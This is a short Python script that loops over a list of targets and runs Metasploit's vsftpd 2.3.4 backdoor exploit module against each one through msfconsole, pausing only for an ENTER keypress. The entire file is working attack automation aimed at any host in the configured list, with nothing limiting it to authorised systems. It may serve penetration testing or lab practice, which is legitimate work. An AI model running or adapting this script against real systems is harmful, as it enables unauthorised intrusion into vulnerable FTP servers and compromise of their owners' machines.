import subprocess
from utils.config import get_targets

def run_metasploit(module, targets):
    for target in targets:
        input(f"[!] Ready to run exploit against {target}. Press ENTER to continue.")

        cmd = f"""
        use {module}
        set RHOSTS {target}
        run
        exit
        """

        subprocess.run(
            ["msfconsole", "-q", "-x", cmd],
            capture_output=True,
            text=True
        )

        print(f"[+] Exploit attempt completed for {target}")


if __name__ == "__main__":
    targets = get_targets()
    module = "exploit/unix/ftp/vsftpd_234_backdoor"
    run_metasploit(module, targets)
